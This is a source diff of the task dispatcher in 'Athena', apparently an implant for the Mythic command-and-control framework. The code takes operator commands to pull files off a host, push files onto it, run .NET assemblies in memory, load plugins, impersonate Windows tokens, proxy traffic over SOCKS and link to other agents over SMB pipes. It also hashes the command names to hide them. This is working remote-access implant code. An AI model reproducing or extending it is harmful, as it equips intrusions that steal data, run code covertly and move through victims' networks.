@@ -1,422 +1,528 @@
-using Athena.Commands.Model;
-using Athena.Models.Athena.Assembly;
+
+﻿#if DEBUG
+    //#define WINBUILD
+#endif
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Tasks;
 using Athena.Utilities;
-using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Linq;
-using System.Threading;
 using System.Threading.Tasks;
+using System.Collections.Concurrent;
+using System.Text;
+using PluginBase;
+using Newtonsoft.Json;
 
 namespace Athena.Commands
 {
-
     public class CommandHandler
     {
-        static string executeAssemblyTask = "";
-        
-        /// <summary>
-        /// Kick off a MythicJob
-        /// </summary>
-        /// <param name="job">MythicJob containing execution parameters</param>
-        public static void StartJob(MythicJob job)
+        public delegate void SetSleepAndJitterHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> SetSleepAndJitter;
+        public delegate void StartForwarderHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StartForwarder;
+        public delegate void StopForwarderHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StopForwarder;
+        public delegate void StartSocksHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StartSocks;
+        public delegate void StopSocksHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> StopSocks;
+        public delegate void ExitRequestedHandler(object sender, TaskEventArgs e);
+        public event EventHandler<TaskEventArgs> ExitRequested;
+
+        private ConcurrentDictionary<string, MythicJob> activeJobs { get; set; }
+        private AssemblyHandler assemblyHandler { get; }
+        private DownloadHandler downloadHandler { get; }
+        private UploadHandler uploadHandler { get; }
+#if WINBUILD
+        private TokenHandler tokenHandler { get; }
+#endif
+        private ConcurrentBag<object> responseResults { get; set; }
+        public CommandHandler()
         {
-            switch (job.task.command)
+            this.activeJobs = new ConcurrentDictionary<string, MythicJob>();
+            this.assemblyHandler = new AssemblyHandler();
+            this.downloadHandler = new DownloadHandler();
+            this.uploadHandler = new UploadHandler();
+            this.responseResults = new ConcurrentBag<object>();
+
+#if WINBUILD
+
+            this.tokenHandler = new TokenHandler();
+#endif
+        }
+        /// <summary>
+        /// Initiate a task provided by the Mythic server
+        /// </summary>
+        /// <param name="task">MythicTask object containing the parameters of the task</param>
+        public async Task StartJob(MythicTask task)
+        {
+            MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
+            job.started = true;
+#if WINBUILD
+            if(task.token != 0)
             {
-                case "download":
-                    Task.Run(() => {
-                        if (!Globals.downloadJobs.ContainsKey(job.task.id))
-                        {
-                            MythicDownloadJob downloadJob = new MythicDownloadJob(job);
-                            Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                            downloadJob.path = par["File"].Replace("\"", "");
-                            downloadJob.total_chunks = downloadJob.GetTotalChunks();
-                            
-                            Globals.downloadJobs.Add(job.task.id, downloadJob);
-
-                            if (downloadJob.total_chunks == 0)
-                            {
-                                job.errored = true;
-                                job.taskresult = "An error occurred while attempting to access the file.";
-                                job.hasoutput = true;
-                                job.complete = true;
-                            }
-
-                            //Download response ready to return
-                            job.started = true;
-                            job.taskresult = "";
-                            job.hasoutput = true;
-                        }
+                if(!await this.tokenHandler.ThreadImpersonate(task.token))
+                {
+                    this.responseResults.Add(new ResponseResult()
+                    {
+                        task_id = task.id,
+                        user_output = "Failed to impersonate!",
+                        status = "errored",
+                        completed = "true",
                     });
-                    break;
-                case "execute-assembly":
-                    if (executeAssemblyTask != "")
+                    return;
+                }
+            }
+#endif
+            switch (job.task.command.ToHash())
+            {
+                case "FD456406745D816A45CAE554C788E754": //download
+                    if (!await downloadHandler.ContainsJob(job.task.id))
                     {
-                        completeJob(ref job, "Failed to load assembly. Another assembly is already executing.", true);
+                        this.responseResults.Add(await downloadHandler.StartDownloadJob(job));
+                    }
+                    break;
+                case "C6E6495DF88816EAC7376920027393A4": //execute-assembly
+                    this.responseResults.Add(await assemblyHandler.ExecuteAssembly(job));
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
+                case "F24F62EEB789199B9B2E467DF3B1876B": //Exit
+                    RequestExit(job);
+                    break;
+                case "27A06A9E3D5E7F67EB604A39536208C9": //jobs
+                    this.responseResults.Add(await this.GetJobs(task.id));
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
+                case "363AFEF7C118EEDBD908495180280BB7": //jobkill
+                    if (this.activeJobs.ContainsKey(task.parameters))
+                    {
+                        this.activeJobs[task.parameters].cancellationtokensource.Cancel();
+                        this.responseResults.Add(new ResponseResult
+                        {
+                            user_output = "Cancelled job",
+                            completed = "true",
+                            task_id = job.task.id,
+                        });
                     }
                     else
                     {
-                        var t = Task.Run(() =>
+                        this.responseResults.Add(new ResponseResult
                         {
-                            job.cancellationtokensource.Token.ThrowIfCancellationRequested();
-                            executeAssemblyTask = job.task.id;
-                            ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
-                            job.taskresult = "";
-                            job.hasoutput = true;
-
-                            using (var consoleWriter = new ConsoleWriter())
-                            {
-                                var origStdout = Console.Out;
-                                try
-                                {
-                                    consoleWriter.WriteLineEvent += consoleWriter_WriteLineEvent;
-                                    //Set output for our ConsoleWriter
-                                    Console.SetOut(consoleWriter);
-                                    //Start a new thread for our blocking Execute-Assembly
-                                    try
-                                    {
-                                        job.hasoutput = true;
-                                        AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
-
-                                        //Assembly finished executing.
-                                        executeAssemblyTask = "";
-                                        job.complete = true;
-                                        Console.SetOut(origStdout);
-                                        return;
-                                    }
-                                    catch (Exception)
-                                    {
-                                        //Cancellation was requested, clean up.
-                                        executeAssemblyTask = "";
-                                        completeJob(ref job, "", true);
-                                        Console.SetOut(origStdout);
-                                        Globals.alc.Unload();
-                                        Globals.alc = new ExecuteAssemblyContext();
-                                        return;
-                                    }
-                                }
-                                catch (Exception e)
-                                {
-                                    executeAssemblyTask = "";
-                                    completeJob(ref job, e.Message, true);
-                                    Console.SetOut(origStdout);
-                                }
-                            }
-                        }, job.cancellationtokensource.Token);
+                            user_output = "Job doesn't exist",
+                            completed = "true",
+                            task_id = job.task.id,
+                            status = "error"
+                        });
                     }
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                case "exit":
-                    Environment.Exit(0);
+                case "2A304A1348456CCD2234CD71A81BD338": //link
+                    StartInternalForwarder(job); //I could maybe make this a loadable plugin? it may require some changes to how delegates are passed
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                case "jobs":
-                    Task.Run(() => {
-                        string output = "[";
-                        foreach (var job in Globals.jobs)
-                        {
-                            output += $"{{\"id\":\"{job.Value.task.id}\",";
-                            output += $"\"command\":\"{job.Value.task.command}\",";
-                            if (job.Value.started & !job.Value.complete)
-                            {
-                                output += $"\"status\":\"Started\"}},";
-                            }
-                            else if (job.Value.complete)
-                            {
-                                output += $"\"status\":\"Completed\"}},";
-                            }
-                            else
-                            {
-                                output += $"\"status\":\"Not Started\"}},";
-                            }
-                        }
-                        output = output.TrimEnd(',') + "]";
-                        completeJob(ref job, output, false);
-                    }, job.cancellationtokensource.Token);
+                case "EC4D1EB36B22D19728E9D1D23CA84D1C": //load
+                    this.responseResults.Add(await assemblyHandler.LoadCommandAsync(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                case "jobkill":
-                    Task.Run(() =>
-                    {
-                        MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == x.Value.task.parameters).Value;
-                        if (job is not null)
-                        {
-                            //Attempt the cancel.
-                            job.cancellationtokensource.Cancel();
-
-                            //Wait to see if the cancel took.
-                            for (int i = 0; i != 31; i++)
-                            {
-                                //Job exited successfully
-                                if (job.complete)
-                                {
-                                    completeJob(ref job, $"Task {job.task.parameters} exited successfully.", false);
-                                    break;
-                                }
-                                //Job may have failed to cancel
-                                if (i == 30 && !job.complete)
-                                {
-                                    completeJob(ref job, $"Unable to cancel Task: {job.task.parameters}. Request timed out.", true);
-                                }
-
-                                //Wait 1s, This will be 30s once all the loops complete.
-                                Thread.Sleep(1000);
-                            }
-                        }
-                        else
-                        {
-                            completeJob(ref job, $"Task {job.task.parameters} not found!", true);
-                        }
-                    }, job.cancellationtokensource.Token);
+                case "790C1BE487AC4162A26A760E50AE619A": //load-assembly
+                    this.responseResults.Add(await assemblyHandler.LoadAssemblyAsync(job)); //I bet I could make this a plugin by using the current app context
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                case "link":
-                    {
-                        Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                        if (par.ContainsKey("hostname") && par.ContainsKey("pipename"))
-                        {
-                            if (Globals.mc.MythicConfig.smbForwarder.Link(par["hostname"], par["pipename"]).Result)
-                            {
-                                completeJob(ref job, "Link established.", false);
-                            }
-                            else
-                            {
-                                if (Globals.mc.MythicConfig.smbForwarder.connected)
-                                {
-                                    completeJob(ref job, "A connection has already been established with an Athena agent.", true);
-                                }
-                                else
-                                {
-                                    completeJob(ref job, "An error occured while establishing a link :(", true);
-                                }
-                            }
-                        }
-                        else
-                        {
-                            completeJob(ref job, "Invalid command line parameters.", true);
-                        }
-
-                    }
+                case "E659634F6A18B0CACD0AB3C3A95845A7": //reset-assembly-context
+                    this.responseResults.Add(await assemblyHandler.ClearAssemblyLoadContext(job));
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                case "load":
-                    Task.Run(() =>
-                    {
-                        LoadCommand lc = JsonConvert.DeserializeObject<LoadCommand>(job.task.parameters);
-                        completeJob(ref job, AssemblyHandler.LoadCommand(Misc.Base64DecodeToByteArray(lc.assembly), lc.command), false);
-                    }, job.cancellationtokensource.Token);
+                case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
+                    UpdateSleepAndJitter(job);
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                //Can these all be merged into one and handled on the server-side?
-                case "load-assembly":
-                    Task.Run(() => {
-                        try
-                        {
-                            LoadAssembly la = JsonConvert.DeserializeObject<LoadAssembly>(job.task.parameters);
-                            completeJob(ref job, AssemblyHandler.LoadAssembly(Misc.Base64DecodeToByteArray(la.assembly)), false);
-                        }
-                        catch (Exception e)
-                        {
-                            completeJob(ref job, e.Message, true);
-                        }
-                    }, job.cancellationtokensource.Token);
-                    break;
-                case "reset-assembly-context":
-                    Task.Run(() =>
-                    {
-                        completeJob(ref job, AssemblyHandler.ClearAssemblyLoadContext(), false);
-                    }, job.cancellationtokensource.Token);
-                    break;
-                case "shell":
-                    Task.Run(() =>
-                    {
-                        Execution.ShellExec(job);
-                    }, job.cancellationtokensource.Token);
-                    break;
-                case "sleep":
-                    var sleepInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    if (sleepInfo.ContainsKey("sleep"))
-                    {
-                        try
-                        {
-                            Globals.mc.MythicConfig.sleep = int.Parse(sleepInfo["sleep"].ToString());
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                            job.taskresult += "Invalid sleeptime specified." + Environment.NewLine;
-                            job.errored = true;
-                        }
-                    }
-                    if (sleepInfo.ContainsKey("jitter"))
-                    {
-                        try
-                        {
-                            Globals.mc.MythicConfig.jitter = int.Parse(sleepInfo["jitter"].ToString());
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                            job.taskresult += "Invalid jitter specified." + Environment.NewLine;
-                            job.errored = true;
-                        }
-                    }
-                    if (!job.errored)
-                    {
-                        completeJob(ref job, "Sleep updated successfully.", false);
-                    }
-                    else
-                    {
-                        completeJob(ref job, job.taskresult, true);
-                    }
-                    break;
-                case "socks":
+                case "3E5A1B3B990187C9FB8E8156CE25C243": //socks
                     var socksInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    if (socksInfo["action"].ToString() == "start")
+
+
+                    if (((string)socksInfo["action"]).IsEqualTo("EA2B2676C28C0DB26D39331A336C6B92")) //start
                     {
-                        if (Globals.socksHandler is null)
-                        {
-                            Globals.socksHandler = new SocksHandler();
-                            Globals.socksHandler.Start();
-                        }
-                        else
-                        {
-                            if (Globals.socksHandler.running)
-                            {
-                                completeJob(ref job, "SocksHandler is already running.", true);
-                            }
-                            else
-                            {
-                                Globals.socksHandler.Start();
-                                completeJob(ref job, "Socks started.", false);
-                            }
-                        }
+                        StartSocksProxy(job);
                     }
                     else
                     {
-                        try
-                        {
-                            if (Globals.socksHandler is not null)
-                            {
-                                Globals.socksHandler.Stop();
-                                completeJob(ref job, "Socks stopped.", false);
-                            }
-                            else
-                            {
-                                completeJob(ref job, "Socks is not running.", true);
-                            }
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                            completeJob(ref job, "Socks is not running.", true);
-                        }
+                        StopSocksProxy(job);
                     }
+                    this.activeJobs.Remove(task.id, out _);
                     break;
-                case "stop-assembly":
-                    Task.Run(() => {
-                        completeJob(ref job, "This function does not work properly yet.", true);
-                    }, job.cancellationtokensource.Token);
-                    break;
-                case "unlink":
-                    Task.Run(() =>
+                case "5D343B8042C5EE2EA7C892C5ECC16E30": //stop-assembly
+                    this.responseResults.Add(new ResponseResult
                     {
-                        if (Globals.socksHandler.running)
-                        {
-                            Globals.socksHandler.Stop();
-                            completeJob(ref job, "Unlinked from agent.", false);
-                        }
-                        else
-                        {
-                            completeJob(ref job, "No agent currently connected.", true);
-                        }
-                    }, job.cancellationtokensource.Token);
-                    break;
-                case "upload":
-                    var uploadTask = Task.Run(() =>
+                        user_output = "Not implemented yet.",
+                        completed = "true",
+                        task_id = job.task.id,
+                    });
+                    this.activeJobs.Remove(task.id, out _);
+                    break; 
+#if WINBUILD
+                case "94A08DA1FECBB6E8B46990538C7B50B2": //token
+                    var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+                    if (String.IsNullOrEmpty((string)tokenInfo["username"]))
                     {
-                        try
-                        {
-                            if (!Globals.uploadJobs.ContainsKey(job.task.id))
-                            {
-                                MythicUploadJob uj = new MythicUploadJob(job);
-                                Dictionary<string, string> par = JsonConvert.DeserializeObject<Dictionary<string, string>>(job.task.parameters);
-                                uj.path = par["remote_path"];
-                                uj.file_id = par["file"];
-                                uj.task = job.task;
-                                uj.chunk_num = 1;
-                                job.started = true;
-                                job.hasoutput = true;
-                                job.taskresult = "";
+                        this.responseResults.Add(await this.tokenHandler.ListTokens(job)); //This could definitely be a plugin...I think. Explore tomorrow
+                    }
+                    else
+                    {
+                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
+                    }
 
-                                //Add job to job tracking Dictionary
-                                Globals.uploadJobs.Add(uj.task.id, uj);
-                            }
-                        }
-                        catch (Exception e)
-                        {
-                            Misc.WriteError(e.Message);
-                            completeJob(ref job, e.Message, true);
-                        }
-
-                    }, job.cancellationtokensource.Token);
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
+#endif
+                case "695630CFC5EB92580FB3E76A0C790E63": //unlink
+                    StopInternalForwarder(job);
+                    this.activeJobs.Remove(task.id, out _); //plugin-able if we move link there
+                    break;
+                case "F972C1D6198BAF47DD8FD9A05832DB0F": //unload
+                    this.responseResults.Add(await assemblyHandler.UnloadCommands(job));
+                    this.activeJobs.Remove(task.id, out _);
+                    break;
+                case "76EE3DE97A1B8B903319B7C013D8C877": //upload
+                    if(!await downloadHandler.ContainsJob(job.task.id))
+                    {
+                        this.responseResults.Add(await uploadHandler.StartUploadJob(job));
+                    }
                     break;
                 default:
-                    var defaultTask = Task.Run(() =>
+                    ResponseResult rr = (ResponseResult)await CheckAndRunPlugin(job);
+                    
+                    if(rr is not null)
                     {
-                        checkAndRunPlugin(job);
-                    }, job.cancellationtokensource.Token);
+                        this.responseResults.Add(rr);
+                        this.activeJobs.Remove(task.id, out _);
+
+                    }
+
                     break;
             }
-        }
-        
-        static void consoleWriter_WriteLineEvent(object sender, ConsoleWriterEventArgs e)
-        {
-            try
+#if WINBUILD
+            if (task.token != 0)
             {
-                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == executeAssemblyTask).Value;
-                job.taskresult += e.Value + Environment.NewLine;
-                job.hasoutput = true;
+                await this.tokenHandler.ThreadRevert();
             }
-            catch (Exception f)
-            {
-                Misc.WriteError(f.Message);
-                //Fail silently
-            }
+#endif
         }
-
         /// <summary>
-        /// Determine if a Mythic command is loaded, if it is, run it
+        /// EventHandler to begin exit
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void RequestExit(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            ExitRequested(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to start socks proxy
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StartSocksProxy(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StartSocks(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to stop socks proxy
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StopSocksProxy(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StopSocks(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to start internal forwarder
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StartInternalForwarder(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StartForwarder(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to stop internal forwarder
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void StopInternalForwarder(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            StopForwarder(this, exitArgs);
+        }
+        /// <summary>
+        /// EventHandler to update sleep and jitter
+        /// </summary>
+        /// <param name="job">MythicJob to pass with the event</param>
+        private void UpdateSleepAndJitter(MythicJob job)
+        {
+            TaskEventArgs exitArgs = new TaskEventArgs(job);
+            SetSleepAndJitter(this, exitArgs);
+        }
+        /// <summary>
+        /// Cancel a currently executing job
+        /// </summary>
+        /// <param name="task">MythicTask containing the task id to cancel</param>
+        public async Task StopJob(MythicTask task)
+        {
+            //todo
+        }
+        /// <summary>
+        /// Provide a list of repsonses to the MythicClient
+        /// </summary>
+        public async Task<List<object>> GetResponses()
+        {
+            List<object> responses = this.responseResults.ToList<object>();
+            this.responseResults.Clear();
+
+            if (this.assemblyHandler.assemblyIsRunning)
+            {
+                responses.Add(await this.assemblyHandler.GetAssemblyOutput());
+            }
+
+            responses.AddRange(await PluginHandler.GetResponses());
+
+            foreach(ResponseResult response in responses)
+            {
+                if (this.activeJobs.ContainsKey(response.task_id) && response.completed ==  "true")
+                {
+                    this.activeJobs.Remove(response.task_id, out _);
+                }
+            }
+
+            return responses;
+        }
+        /// <summary>
+        /// Add a ResponseResult to the response list
+        /// </summary>
+        /// <param name="response">ResposneResult or inherited object containing the task results</param>
+        public async Task AddResponse(object response)
+        {
+            this.responseResults.Add(response);
+        }
+        /// <summary>
+        /// Add multiple ResponseResult to the response list
+        /// </summary>
+        /// <param name="response">ResposneResult or inherited object containing the task results</param>
+        public async Task AddResponse(List<object> responses)
+        {
+            List<object> tmpResponse = new List<object>();
+            responses.ForEach(response => tmpResponse = this.responseResults.Prepend<object>(response).ToList());
+            this.responseResults = new ConcurrentBag<object>(tmpResponse);
+        }
+        /// <summary>
+        /// Get the currently running jobs
+        /// </summary>
+        /// <param name="task_id">Task ID of the mythic job to respond to</param>
+        private async Task<ResponseResult> GetJobs(string task_id)
+        {
+            List<object> jobs = new List<object>();
+
+            foreach(var j in this.activeJobs)
+            {
+                var test = new
+                {
+                    id = j.Value.task.id,
+                    status = j.Value.started ? "started" : "queued",
+                    command = j.Value.task.command
+                };
+                jobs.Add(test);
+            }
+
+            return new ResponseResult()
+            {
+                user_output = JsonConvert.SerializeObject(jobs),
+                task_id = task_id,
+                completed = "true"
+            };
+        }     
+        /// <summary>
+        /// Check if a plugin is already loaded and execute it
         /// </summary>
         /// <param name="job">MythicJob containing execution parameters</param>
-        static void checkAndRunPlugin(MythicJob job)
+        private async Task<object> CheckAndRunPlugin(MythicJob job)
         {
-            if (Globals.loadedcommands.ContainsKey(job.task.command))
+            if (await this.assemblyHandler.CommandIsLoaded(job.task.command))
             {
-                PluginResponse pr = AssemblyHandler.RunLoadedCommand(job.task.command, JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters));
-                completeJob(ref job, pr.output, !pr.success);
+                return await this.assemblyHandler.RunLoadedCommand(job);
             }
             else
             {
-                completeJob(ref job, "Plugin not loaded. Please use the load command to load the plugin!", true);
+                return new ResponseResult()
+                {
+                    completed = "true",
+                    user_output = "Plugin not loaded. Please use the load command to load the plugin!",
+                    task_id = job.task.id,
+                    status = "error",
+                };
             }
         }
-
         /// <summary>
-        /// Complete a MythicJob
+        /// Begin the next process of the upload task
         /// </summary>
-        /// <param name="job">MythicJob containing execution parameters</param>
-        /// <param name="output">Output to return as a mythic task</param>
-        /// <param name="error">Boolean indicating whether the task errored or not</param>
-        private static void completeJob(ref MythicJob job, string output, bool error)
+        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
+        public async Task HandleUploadPiece(MythicResponseResult response)
         {
-            job.taskresult = output;
-            job.complete = true;
-            job.errored = error;
-            if (!String.IsNullOrEmpty(output))
+            MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
+            if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
-                job.hasoutput = true;
+                this.activeJobs.Remove(response.task_id, out _);
+                await this.uploadHandler.CompleteUploadJob(response.task_id);
+            }
+
+            if(uploadJob.total_chunks == 0)
+            {
+                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
+            }
+            if (!String.IsNullOrEmpty(response.chunk_data)) //Handle our current chunk
+            {
+                await this.uploadHandler.UploadNextChunk(await Misc.Base64DecodeToByteArrayAsync(response.chunk_data), response.task_id);
+                uploadJob.chunk_num++;
+                if (response.chunk_num == uploadJob.total_chunks)
+                {
+                    await this.uploadHandler.CompleteUploadJob(response.task_id);
+                    this.activeJobs.Remove(response.task_id, out _);
+                    this.responseResults.Add(new UploadResponse
+                    {
+                        task_id=response.task_id,
+                        completed = "true",
+                        upload = new UploadResponseData
+                        {
+                            chunk_num = uploadJob.chunk_num,
+                            file_id = response.file_id,
+                            chunk_size = uploadJob.chunk_size,
+                            full_path = uploadJob.path
+                        }
+                    });
+                }
+                else
+                {
+                    this.responseResults.Add(new UploadResponse
+                    {
+                        task_id = response.task_id,
+                        upload = new UploadResponseData
+                        {
+                            chunk_num = uploadJob.chunk_num,
+                            file_id = response.file_id,
+                            chunk_size = uploadJob.chunk_size,
+                            full_path = uploadJob.path
+                        }
+                    });
+                }
+
             }
             else
             {
-                job.hasoutput = false;
+                this.responseResults.Add(new ResponseResult
+                {
+                    status = "error",
+                    completed = "true",
+                    task_id = response.task_id,
+                    user_output = "Mythic sent no data to upload!"
+
+                });
             }
         }
+        /// <summary>
+        /// Begin the next process of the download task
+        /// </summary>
+        /// <param name="response">The MythicResponseResult object provided from the Mythic server</param>
+        public async Task HandleDownloadPiece(MythicResponseResult response)
+        {
+            MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
+            if (downloadJob.cancellationtokensource.IsCancellationRequested)
+            {
+                this.activeJobs.Remove(response.task_id, out _);
+                await this.uploadHandler.CompleteUploadJob(response.task_id);
+            }
+
+            if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
+            {
+                await this.downloadHandler.CompleteDownloadJob(response.task_id);
+                this.activeJobs.Remove(response.task_id, out _);
+                this.responseResults.Add(new DownloadResponse
+                {
+                    task_id = response.task_id,
+                    status = "error",
+                    user_output = "No file_id received",
+                    completed = "true"
+                });
+            }
+            else
+            {
+                if (String.IsNullOrEmpty(downloadJob.file_id))
+                {
+                    downloadJob.file_id = response.file_id;
+                }
+
+                if (response.status == "success")
+                {
+                    if (downloadJob.chunk_num != downloadJob.total_chunks)
+                    {
+                        downloadJob.chunk_num++;
+
+                        this.responseResults.Add(new DownloadResponse
+                        {
+                            task_id = response.task_id,
+                            user_output = String.Empty,
+                            status = "processed",
+                            full_path = String.Empty,
+                            total_chunks = -1,
+                            file_id = downloadJob.file_id,
+                            chunk_num = downloadJob.chunk_num,
+                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
+                        });
+                    }
+                    else
+                    {
+                        await this.downloadHandler.CompleteDownloadJob(response.task_id);
+                        this.activeJobs.Remove(response.task_id, out _);
+                        this.responseResults.Add(new DownloadResponse
+                        {
+                            task_id = response.task_id,
+                            user_output = String.Empty,
+                            status = String.Empty,
+                            full_path = String.Empty,
+                            chunk_num = downloadJob.chunk_num,
+                            chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob),
+                            file_id = downloadJob.file_id,
+                            completed = "true",
+                            total_chunks = -1
+
+                        });
+                    }
+                }
+                else
+                {
+                    this.responseResults.Add(new DownloadResponse
+                    {
+                        task_id = response.task_id,
+                        file_id = downloadJob.file_id,
+                        chunk_num = downloadJob.chunk_num,
+                        chunk_data = await this.downloadHandler.DownloadNextChunk(downloadJob)
+                    });
+                }
+            }
+        }
+        /// <summary>
+        /// Check if an upload job exists
+        /// </summary>
+        /// <param name="task_id">Task ID of the mythic job to respond to</param>
+        public async Task<bool> HasUploadJob(string task_id)
+        {
+            return await this.uploadHandler.ContainsJob(task_id);
+        }
+        /// <summary>
+        /// Check if a download job exists
+        /// </summary>
+        /// <param name="task_id">Task ID of the mythic job to respond to</param>
+        public async Task<bool> HasDownloadJob(string task_id)
+        {
+            return await this.downloadHandler.ContainsJob(task_id);
+        }   
     }
 }
